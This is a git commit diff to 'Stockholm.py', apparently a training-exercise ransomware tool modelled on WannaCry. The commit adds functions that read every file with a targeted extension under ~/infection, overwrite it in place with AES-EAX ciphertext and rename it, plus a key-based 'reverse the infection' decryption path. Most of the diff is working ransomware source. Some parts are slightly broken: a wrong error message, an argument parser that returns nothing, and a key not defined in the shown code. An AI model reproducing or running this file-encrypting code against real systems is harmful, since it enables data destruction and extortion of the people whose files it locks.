9fa8015d8e79510995eb7fa5151172190fd932e9
alice <alice@Alice42.myguest.virtualbox.org>
2025-06-05 16:53:09 +0200

    minor upd

--- Stockholm/Stockholm.py
+++ Stockholm/Stockholm.py
@@ -1,6 +1,7 @@
 import argparse
 import os
 import json
+from Crypto.Cipher import AES
 
 VERSION = "1.0.0"
 TARGETDIR = "~/infection"
@@ -32,6 +33,46 @@ def load_extends():
     with open('wannacry_supported_extends', 'r', encoding='utf-8') as file:
         return json.load(file)
     
+def decrypt(silent, file):
+    try:
+        new_filename = file[:-len(EXT)]
+        log(silent, f"decrypting {file}")
+        with open(file, 'r+b') as f:
+            content = f.read()
+            nonce = content[:16]
+            tag = content[16:32]
+            ciphertext = content[32:]
+            cipher = AES.new(Key, AES.MODE_EAX, nonce)
+            data = cipher.decrypt_and_verify(ciphertext, tag)
+            os.rename(file, new_filename)
+            f.truncate(0)
+            f.seek(0)
+            f.write(data)
+        log(silent, f"{new_filename} successfuly decrypted")
+    except Exception as e:
+        log(silent, f"failed to decrypt {new_filename}")
+        print(f"Error: {e}")
+
+def encrypt(silent, file):
+    try:
+        if not file.endswith(EXT):
+            new_filename = file + EXT
+        else:
+            new_filename = file
+        log(silent, f"encrypting {file}")
+        with open(file, 'r+b') as f:
+            content = f.read()
+            cipher = AES.new(Key, AES.MODE_EAX)
+            ciphertext, tag = cipher.encrypt_and_digest(content)
+            new_content = cipher.nonce + tag + ciphertext
+            os.rename(file, new_filename)
+            f.truncate(0)
+            f.seek(0)
+            f.write(new_content)
+            log(silent, f"{new_filename} successfuly encrypted")
+    except Exception as e:
+        log(silent, f"failed to decrypt {new_filename}")
+        print(f"Error: {e}")
 
 def stockholm(reverse, silent, key):
     if (key):
@@ -42,18 +83,24 @@ def stockholm(reverse, silent, key):
     targets = []
     if reverse:
         get_targetfiles(dir_path, [EXT], targets)
-    else:
-        exts = load_extends()     
-        get_targetfiles(dir_path, exts, targets)
-    
+    else:     
+        get_targetfiles(dir_path, load_extends(), targets)
+    if not targets:
+        print("no target. Stop.")
+        exit(1)
+    for file in targets:
+        if reverse:
+            decrypt(silent, file)
+        else:
+            encrypt(silent, file)
 
 def get_args():
     parser = argparse.ArgumentParser()
 
-    parser.add_argument("--help", "-h", action="store_true", help="shows program's options")
-    parser.add_argument("--version", "-v", action="store_true", help="shows programm's version")
-    parser.add_argument("--reverse", "-r", action="store_true", help="to use with a key entered as argument to reverse the infection")
-    parser.add_argument("--silent", "-s", action="store_true", help="no output will be produced")
+    parser.add_argument("-h", "--help", action="store_true", help="shows program's options")
+    parser.add_argument("-v", "--version", action="store_true", help="shows programm's version")
+    parser.add_argument("-r", "--reverse", action="store_true", help="to use with a key entered as argument to reverse the infection")
+    parser.add_argument("-s", "--silent", action="store_true", help="no output will be produced")
 
 def main():
     args = get_args()
